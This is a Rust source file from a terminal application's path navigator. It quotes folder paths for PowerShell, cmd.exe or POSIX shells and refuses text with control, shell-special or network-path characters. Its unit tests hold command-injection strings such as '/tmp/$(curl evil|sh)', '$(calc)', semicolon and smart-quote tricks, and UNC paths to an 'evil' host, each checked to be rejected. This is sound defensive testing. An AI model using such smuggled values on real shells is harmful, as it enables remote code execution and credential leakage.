//! Paths in program text: quoting a path for the shell that will read it, the one guard every
//! write of program-controlled text goes through (B5), and the prompt path navigator (13r Task
//! 9): the paths a shell prompt shows (`PE:31-80`), the folders among them (`PS2:118-191`), the
//! list a click opens (`PCH:94-150`) and what a pick writes (`PS.swift:1233-1242`).

/// The refusal banner for text with a control character.
pub const REFUSED: &str = "Termurion did not write this text to the terminal: it holds a control character.";

/// `s` when it is safe to type into a terminal: no C0 control (CR, LF and ESC included), DEL,
/// C1 control, bidirectional formatting or zero-width character.
pub fn safe_text(s: &str) -> Option<&str> {
    // `is_hidden` is control (C0, DEL, C1), bidi formatting, line and paragraph separators and
    // zero-width characters: the one set every label drops.
    (!s.chars().any(crate::inert_files::is_hidden)).then_some(s)
}

/// Which shell reads a quoted path.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Shell {
    PowerShell,
    Cmd,
    Posix,
    /// No shell is named: nothing is quoted for a guess.
    Unknown,
}

/// The shell a reported name or path stands for (`/bin/zsh`, `C:\Windows\System32\cmd.exe`,
/// `pwsh`). Anything else, and no report at all, is `Unknown`: it is never read as cmd.exe.
pub fn shell_of(name: Option<&str>) -> Shell {
    let lower = name.unwrap_or_default().to_lowercase();
    let base = lower.rsplit(['\\', '/']).next().unwrap_or_default();
    let stem = base.trim_end_matches(".exe");
    if stem.contains("pwsh") || stem.contains("powershell") {
        Shell::PowerShell
    } else if matches!(stem, "bash" | "zsh" | "sh" | "fish" | "dash" | "ksh" | "tcsh" | "csh") {
        Shell::Posix
    } else if stem == "cmd" {
        Shell::Cmd
    } else {
        Shell::Unknown
    }
}

/// What a refusal of a network directory says.
pub const NETWORK_REFUSED: &str = "Termurion did not write this path to the terminal: it is a network path.";

/// `dir` when it is not a network path (the one rule, `scripts::is_network_path`): writing one
/// would send the person's credentials to whatever host it names.
pub fn checked_directory(dir: &str) -> Result<&str, String> {
    if crate::scripts::is_network_path(dir) {
        return Err(NETWORK_REFUSED.to_string());
    }
    Ok(dir)
}

/// The program a launch command line names: a quoted path whole, else its first word.
pub fn launch_program(command: &str) -> Option<&str> {
    let c = command.trim_start();
    if let Some(rest) = c.strip_prefix('"') {
        return rest.split('"').next().filter(|p| !p.is_empty());
    }
    c.split_whitespace().next()
}

/// What the union refusal says.
pub const UNION_REFUSED: &str = "Termurion did not write this path to the terminal: it holds a character some shells would read.";

/// A character special in some supported shell. The shell a pane runs is only what a program
/// reported (OSC 1337, RemoteHost) or what it launched, so no name loosens this: a path is
/// written only when no supported shell reads anything special in it.
fn special_in_some_shell(c: char) -> bool {
    matches!(c, '$' | '`' | '\'' | '"' | '%' | '^' | '&' | '|' | '<' | '>' | ';' | '(' | ')' | '!' | '{' | '}' | '*' | '?' | '[' | ']' | '~' | '#'
        | '\u{2018}'..='\u{201f}' | '\u{2032}' | '\u{2033}' | '\u{ff02}' | '\u{ff07}')
}

/// `path` quoted for `shell`, or Err with the banner when it cannot be written safely. The union
/// refusal, the control-character guard and the network rule come first, for every shell; the
/// name only picks the quoting of what passes.
pub fn quote_for(path: &str, shell: Shell) -> Result<String, String> {
    let path = safe_text(path).ok_or_else(|| REFUSED.to_string())?;
    checked_directory(path)?;
    // A drive root is written as `X:\.`: the same folder, safe in every wrapper.
    let root = crate::semantic::drive_root_form(path);
    let path = root.as_deref().unwrap_or(path);
    if path.chars().any(special_in_some_shell) || path.ends_with('\\') {
        return Err(UNION_REFUSED.to_string());
    }
    Ok(match shell {
        Shell::PowerShell => format!("'{path}'"),
        // The union refusal holds no quote or %, so double quotes are enough for cmd.exe and for
        // a shell no report names.
        Shell::Cmd | Shell::Unknown => format!("\"{path}\""),
        Shell::Posix => {
            let mut out = String::new();
            for c in path.chars() {
                if !(c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '/' | '-')) {
                    out.push('\\');
                }
                out.push(c);
            }
            out
        }
    })
}

/// A path-shaped run in a prompt row: its text and its columns (`start..end`) on the row.
#[derive(Clone, Debug, PartialEq)]
pub struct Candidate {
    pub text: String,
    pub start: usize,
    pub end: usize,
}

/// The paths a prompt row shows (`PE:31-80`).
pub fn candidates(row: &[char]) -> Vec<Candidate> {
    let run = |c: char| c.is_alphanumeric() || matches!(c, '/' | '\\' | '_' | '.' | '-' | '~');
    let mut out = Vec::new();
    let mut i = 0;
    while i < row.len() {
        // A token boundary: the start of the row or a character a path never holds.
        let boundary = i == 0 || !run(row[i - 1]);
        let drive = row[i].is_ascii_alphabetic() && matches!(row.get(i + 1), Some(':')) && matches!(row.get(i + 2), Some('\\' | '/'));
        if !(boundary && (matches!(row[i], '/' | '~') || drive)) {
            i += 1;
            continue;
        }
        let mut end = i + 1;
        if drive {
            // The colon after the drive letter is the one place `:` belongs to a path.
            end = i + 2;
        }
        while end < row.len() && run(row[end]) {
            end += 1;
        }
        out.push(Candidate { text: row[i..end].iter().collect(), start: i, end });
        i = end;
    }
    out
}

/// `candidate` as an absolute path (`PS2:118-131`): absolute as is, `~` from `home`, anything
/// else joined to `cwd`; None without one.
pub fn expand(candidate: &str, cwd: Option<&str>, home: &str) -> Option<String> {
    let bytes = candidate.as_bytes();
    let drive = bytes.len() >= 3 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && matches!(bytes[2], b'\\' | b'/');
    if candidate.starts_with('/') || drive {
        return Some(candidate.to_string());
    }
    if candidate == "~" {
        return Some(home.to_string());
    }
    let (base, rest) = match candidate.strip_prefix("~/").or_else(|| candidate.strip_prefix("~\\")) {
        Some(rest) => (home, rest),
        None => (cwd?, candidate),
    };
    Some(join(base, rest))
}

/// `base` and `rest` joined with the separator `base` uses (`\` when it holds one).
fn join(base: &str, rest: &str) -> String {
    let sep = if base.contains('\\') { '\\' } else { '/' };
    let rest: String = rest.chars().map(|c| if matches!(c, '/' | '\\') { sep } else { c }).collect();
    format!("{}{sep}{rest}", base.trim_end_matches(['\\', '/']))
}

/// A candidate recorded at 133;B, text only: nothing is probed where the bytes are parsed (B4).
#[derive(Clone, Debug, PartialEq)]
pub struct PathCandidate {
    /// The anchor of the candidate's first cell (it survives reflow).
    pub anchor: crate::marks::Anchor,
    pub start: usize,
    pub end: usize,
    pub text: String,
}

/// A folder in a prompt that a click may open the navigator on.
#[derive(Clone, Debug, PartialEq)]
pub struct PathMark {
    /// The anchor of the path's first cell: reflow moves rows but keeps it.
    pub row_anchor: crate::marks::Anchor,
    pub start: usize,
    pub end: usize,
    pub path: String,
}

/// The candidates that name an existing folder this machine may probe, as marks (`PS2:118-191`).
pub fn sniff(cands: &[PathCandidate], home: &str, probe: &crate::netpath::Probe, is_dir: &dyn Fn(&str) -> bool) -> Vec<PathMark> {
    let mut out: Vec<PathMark> = Vec::new();
    for c in cands {
        let Some(path) = expand(&c.text, None, home) else { continue };
        // The one network rule first: a UNC or mapped-drive path is never asked about (B2).
        if !crate::netpath::may_probe(&path, probe) || !is_dir(&path) {
            continue;
        }
        // Overlapping ranges are dropped (`PS2:118-191`).
        if out.iter().any(|m| m.row_anchor.mark == c.anchor.mark && c.start < m.end && m.start < c.end && m.row_anchor.lines == c.anchor.lines) {
            continue;
        }
        out.push(PathMark { row_anchor: c.anchor, start: c.start, end: c.end, path });
    }
    out
}

/// The parent folder first (detail "Parent directory"), then each subfolder by name with its
/// path as detail (`PCH:94-150`).
pub fn list(path: &str, subfolders: &[String]) -> Vec<(String, String)> {
    let trimmed = path.trim_end_matches(['\\', '/']);
    let sep = if path.contains('\\') { '\\' } else { '/' };
    let mut out = Vec::new();
    // A drive root (`C:`) and the root (empty) have no parent.
    if !trimmed.is_empty() && !trimmed.ends_with(':')
        && let Some(i) = trimmed.rfind(['\\', '/']) {
            let parent = &trimmed[..i];
            let parent = if parent.is_empty() { sep.to_string() } else if parent.ends_with(':') { format!("{parent}{sep}") } else { parent.to_string() };
            out.push((parent, "Parent directory".to_string()));
        }
    let mut names: Vec<&String> = subfolders.iter().collect();
    names.sort();
    for n in names {
        let full = format!("{trimmed}{sep}{n}");
        out.push((full.clone(), full));
    }
    out
}

/// What a pick writes (`PS.swift:1233-1242`).
#[derive(Clone, Debug, PartialEq)]
pub enum Choice {
    /// Type this line (it ends with the Enter).
    Cd(String),
    /// The typed command with the path added, for the Composer.
    Append(String),
}

/// A pick: `cd <path>` and Enter at an empty command line, else the typed command with the
/// path added. Err is the banner when the path cannot be written safely (B5).
pub fn choose(value: &str, typed: &str, shell: Option<&str>) -> Result<Choice, String> {
    let value = safe_text(value).ok_or_else(|| REFUSED.to_string())?;
    let typed = safe_text(typed).ok_or_else(|| REFUSED.to_string())?;
    let kind = shell_of(shell);
    // Every path passes the one guard, quoted or not (control characters, the union refusal,
    // the network rule).
    let quoted = quote_for(value, kind)?;
    if typed.trim().is_empty() {
        // cmd.exe's cd stays on its drive without /d; only a shell known to be cmd gets it.
        let cd = if kind == Shell::Cmd { "cd /d" } else { "cd" };
        return Ok(Choice::Cd(format!("{cd} {quoted}\r")));
    }
    // A path with nothing a shell reads in it is added as it is.
    let plain = value.chars().all(|c| c.is_alphanumeric() && c.is_ascii() || matches!(c, '/' | '\\' | '_' | '.' | '-' | ':'));
    let path = if plain { value.to_string() } else { quoted };
    let gap = if typed.ends_with(char::is_whitespace) { "" } else { " " };
    Ok(Choice::Append(format!("{typed}{gap}{path}")))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shells_are_named_by_shell_integration() {
        assert_eq!(shell_of(Some("pwsh")), Shell::PowerShell);
        assert_eq!(shell_of(Some("PowerShell")), Shell::PowerShell);
        assert_eq!(shell_of(Some("powershell.exe")), Shell::PowerShell);
        assert_eq!(shell_of(Some("bash")), Shell::Posix);
        assert_eq!(shell_of(Some("zsh")), Shell::Posix);
        assert_eq!(shell_of(Some("fish")), Shell::Posix);
        assert_eq!(shell_of(Some("cmd")), Shell::Cmd);
    }


    #[test]
    fn an_unnamed_shell_is_not_guessed() {
        assert_eq!(shell_of(None), Shell::Unknown);
        assert_eq!(shell_of(Some("weird")), Shell::Unknown);
        assert_eq!(shell_of(Some("/bin/zsh")), Shell::Posix);
        assert_eq!(shell_of(Some("C:\\Windows\\System32\\cmd.exe")), Shell::Cmd);
        assert_eq!(shell_of(Some("cmd")), Shell::Cmd);
        for bad in ["C:\\x$(calc)", "C:\\x`calc`", "C:\\a\u{2019}b", "C:\\a\u{201c}b", "/tmp/$(curl evil|sh)", "C:\\a;b", "C:\\a&b", "C:\\100%", "C:\\a!b", "C:\\a'b", "C:\\a~b", "C:\\a#b", "a{b", "a*b", "a?b", "a[b", "a(b)", "a^b", "a<b", "a>b", "a|b"] {
            assert!(quote_for(bad, Shell::Unknown).is_err(), "{bad}");
        }
        assert_eq!(quote_for(r"C:\a b", Shell::Unknown).unwrap(), "\"C:\\a b\"");
        assert_eq!(quote_for(r"C:\a b", Shell::Cmd).unwrap(), "\"C:\\a b\"");
    }

    /// Final wave ruling: a drive root is written as `X:\.` for every shell.
    #[test]
    fn a_drive_root_is_written_in_a_form_every_shell_reads_as_the_root() {
        assert_eq!(quote_for(r"C:\", Shell::Cmd).unwrap(), "\"C:\\.\"");
        assert_eq!(quote_for(r"c:/", Shell::Unknown).unwrap(), "\"c:\\.\"");
        assert_eq!(quote_for(r"C:\", Shell::PowerShell).unwrap(), "'C:\\.'");
        assert_eq!(quote_for(r"C:\", Shell::Posix).unwrap(), "C\\:\\\\.");
        // Only an exact drive root: a trailing backslash on a folder stays refused.
        assert!(quote_for(r"C:\a\", Shell::Cmd).is_err());
        assert!(quote_for(r"C:\\", Shell::Cmd).is_err());
        assert!(quote_for(r"\\", Shell::Cmd).is_err());
    }

    #[test]
    fn quote_for_follows_the_shell() {
        assert_eq!(quote_for(r"C:\a b", Shell::PowerShell).unwrap(), "'C:\\a b'");
        assert_eq!(quote_for(r"C:\a b", Shell::Cmd).unwrap(), "\"C:\\a b\"");
        assert_eq!(quote_for("/home/a b/x\u{e9}", Shell::Posix).unwrap(), "/home/a\\ b/x\\\u{e9}");
        assert_eq!(quote_for("/plain/dir-1_x.y", Shell::Posix).unwrap(), "/plain/dir-1_x.y");
    }

    /// Fix round 2, item 1: the union refusal applies whatever shell is named, because the name
    /// is program text (OSC 1337 shell=, RemoteHost, the launch program in a spoofed pane).
    #[test]
    fn the_union_refusal_applies_to_every_shell() {
        let bad = ["C:\\x$(calc)", "C:\\x`calc`", "C:\\x\\;calc", "C:\\x&calc", "C:\\a'b\u{2019}; calc", "C:\\a\u{201a}b", "C:\\a\u{201b}b", "C:\\a\u{201e} x \u{201e}", "C:\\a\u{201f}b", "C:\\a\u{2032}b", "C:\\a\u{2033}b", "C:\\a\u{ff02}b", "C:\\a\u{ff07}b", "C:\\100%", "C:\\x\\", "/tmp/dir\\", "x\"y"];
        for shell in [Shell::PowerShell, Shell::Cmd, Shell::Posix, Shell::Unknown] {
            for b in bad {
                assert!(quote_for(b, shell).is_err(), "{shell:?} {b}");
            }
        }
        // The name only picks the quoting of what passes.
        assert_eq!(quote_for(r"C:\Program Files\x", Shell::PowerShell).unwrap(), "'C:\\Program Files\\x'");
        assert!(choose("C:\\x$(calc)", "", Some("cmd")).is_err());
        assert!(choose("C:\\x;calc", "", Some("bash")).is_err());
        assert!(choose("C:\\x;calc", "git -C ", Some("sh")).is_err());
    }

    /// Item 2: a network directory (the one network rule) is never written.
    #[test]
    fn a_network_directory_is_never_written() {
        for dir in ["\\\\evil\\s\\x", "//evil/s/x", "/\\evil/s", "\\??\\UNC\\evil\\s"] {
            for shell in [Shell::PowerShell, Shell::Cmd, Shell::Posix, Shell::Unknown] {
                assert_eq!(quote_for(dir, shell), Err(NETWORK_REFUSED.to_string()), "{shell:?} {dir}");
            }
            assert!(choose(dir, "", Some("pwsh")).is_err());
            assert!(checked_directory(dir).is_err());
        }
        assert_eq!(checked_directory(r"C:\Users\rob"), Ok(r"C:\Users\rob"));
    }

    /// Minor 4: a quoted launch path names its program.
    #[test]
    fn a_quoted_launch_path_names_its_program() {
        assert_eq!(launch_program(r#""C:\Program Files\PowerShell\7\pwsh.exe" -NoLogo"#), Some(r"C:\Program Files\PowerShell\7\pwsh.exe"));
        assert_eq!(launch_program("pwsh -NoLogo"), Some("pwsh"));
        assert_eq!(launch_program(r"C:\Windows\System32\cmd.exe /k x"), Some(r"C:\Windows\System32\cmd.exe"));
        assert_eq!(launch_program("  "), None);
        assert_eq!(shell_of(launch_program(r#""C:\Program Files\PowerShell\7\pwsh.exe""#)), Shell::PowerShell);
    }

    #[test]
    fn safe_text_refuses_controls_and_bidi() {
        assert_eq!(safe_text("C:\\Program Files\\x \u{e9}\u{4e2d}"), Some("C:\\Program Files\\x \u{e9}\u{4e2d}"));
        for bad in ["\r", "\n", "\u{1b}", "\u{0}", "\u{7f}", "\u{9b}", "\u{202e}", "\u{2066}", "\u{200b}", "\u{feff}", "\u{2028}"] {
            assert_eq!(safe_text(&format!("a{bad}b")), None, "{bad:?}");
        }
    }

    fn chars(s: &str) -> Vec<char> {
        s.chars().collect()
    }

    fn found(row: &str) -> Vec<(String, usize, usize)> {
        candidates(&chars(row)).into_iter().map(|c| (c.text, c.start, c.end)).collect()
    }

    #[test]
    fn path_candidates_follow_iterm2() {
        assert_eq!(found("PS C:\\Users\\rob> "), [("C:\\Users\\rob".to_string(), 3, 15)]);
        assert_eq!(found("rob@box:~/src/app$ "), [("~/src/app".to_string(), 8, 17)]);
        assert!(found("a/b c").is_empty(), "a slash inside a word is no start");
        assert_eq!(found("x /tmp/a-b_c.d"), [("/tmp/a-b_c.d".to_string(), 2, 14)]);
        assert!(found("C:").is_empty());
        assert!(found("\u{e9}t\u{e9}/").is_empty());
        assert_eq!(found("D:/work> ")[0].0, "D:/work");
    }

    #[test]
    fn navigator_list_follows_iterm2() {
        let subs = ["b", "A", "c"].map(String::from);
        let got = list(r"C:\Users\rob", &subs);
        let values: Vec<&str> = got.iter().map(|(v, _)| v.as_str()).collect();
        assert_eq!(values, [r"C:\Users", r"C:\Users\rob\A", r"C:\Users\rob\b", r"C:\Users\rob\c"]);
        assert_eq!(got[0].1, "Parent directory");
        assert_eq!(got[1].1, r"C:\Users\rob\A");
        assert!(list(r"C:\", &[]).is_empty(), "no parent and nothing inside: the helper closes");
        assert_eq!(list("/home/rob", &["x".to_string()]).iter().map(|(v, _)| v.clone()).collect::<Vec<_>>(), ["/home", "/home/rob/x"]);
        assert_eq!(list("/", &["usr".to_string()]).iter().map(|(v, _)| v.clone()).collect::<Vec<_>>(), ["/usr"]);
        assert_eq!(expand("src", Some(r"C:\a"), r"C:\h"), Some(r"C:\a\src".to_string()));
        assert_eq!(expand("~/x", None, r"C:\h"), Some(r"C:\h\x".to_string()));
        assert_eq!(expand("~", None, r"C:\h"), Some(r"C:\h".to_string()));
        assert_eq!(expand(r"C:\abs", None, r"C:\h"), Some(r"C:\abs".to_string()));
        assert_eq!(expand("x", None, r"C:\h"), None);
    }

    #[test]
    fn navigator_choice_follows_iterm2() {
        assert_eq!(choose(r"C:\a b", "", Some("powershell")), Ok(Choice::Cd("cd 'C:\\a b'\r".into())));
        assert_eq!(choose(r"C:\a", "git -C ", Some("powershell")), Ok(Choice::Append("git -C C:\\a".into())));
        assert_eq!(choose("/tmp/a b", "", Some("bash")), Ok(Choice::Cd("cd /tmp/a\\ b\r".into())));
        assert_eq!(choose(r"C:\a b", "  ", Some("cmd")), Ok(Choice::Cd("cd /d \"C:\\a b\"\r".into())));
        assert_eq!(choose(r"C:\a b", "dir", Some("powershell")), Ok(Choice::Append("dir 'C:\\a b'".into())));
        assert_eq!(quote_for(r"C:\a b", Shell::Cmd).unwrap(), "\"C:\\a b\"");
        // Program text never becomes a line the shell reads (B5).
        assert_eq!(choose("C:\\x\r calc", "", Some("powershell")), Err(REFUSED.to_string()));
        assert_eq!(choose(r"C:\x", "a\nb", Some("powershell")), Err(REFUSED.to_string()));
        assert!(choose("C:\\x$(calc) y", "", None).is_err(), "an unnamed shell refuses what some shell reads");
        assert!(choose("C:\\a%b", "", Some("cmd")).is_err());
    }

    #[allow(non_upper_case_globals)]
    const Remote: crate::netpath::MappedLetters = crate::netpath::MappedLetters(&['Z']);

    fn cand(text: &str) -> PathCandidate {
        PathCandidate { anchor: crate::marks::Anchor { mark: 1, lines: 0, offset: 3 }, start: 3, end: 3 + text.chars().count(), text: text.into() }
    }

    #[test]
    fn prompt_paths_become_marks() {
        let probe = crate::netpath::Probe::default();
        let is_dir = |p: &str| p == r"C:\Users\rob" || p == r"C:\h\src";
        let mut tilde = cand("~/src");
        tilde.start = 40;
        tilde.end = 45;
        let got = sniff(&[cand(r"C:\Users\rob"), cand(r"C:\missing"), tilde], r"C:\h", &probe, &is_dir);
        assert_eq!(got.iter().map(|m| m.path.as_str()).collect::<Vec<_>>(), [r"C:\Users\rob", r"C:\h\src"]);
        assert_eq!((got[0].start, got[0].end, got[0].row_anchor.offset), (3, 3 + 12, 3));
        // A drive the machine reports as remote is never asked about (B2, B4).
        let remote = crate::netpath::Probe { drives: std::sync::Arc::new(Remote), ..crate::netpath::Probe::default() };
        let asked = std::cell::Cell::new(0);
        let counting = |_: &str| {
            asked.set(asked.get() + 1);
            true
        };
        assert!(sniff(&[cand(r"Z:\share\x")], r"C:\h", &remote, &counting).is_empty());
        assert_eq!(asked.get(), 0, "is_dir is never asked on a remote drive");
        // A path some other rule keeps from being probed (a UNC spelling) is not asked either.
        assert!(sniff(&[cand(r"\\evil\s\x")], r"C:\h", &probe, &counting).is_empty());
        assert_eq!(asked.get(), 0);
        let ignored = crate::netpath::Probe { ignore: vec![r"C:\Users".into()], ..crate::netpath::Probe::default() };
        assert!(sniff(&[cand(r"C:\Users\rob")], r"C:\h", &ignored, &counting).is_empty());
        assert_eq!(asked.get(), 0, "an ignored folder is not probed");
    }
}
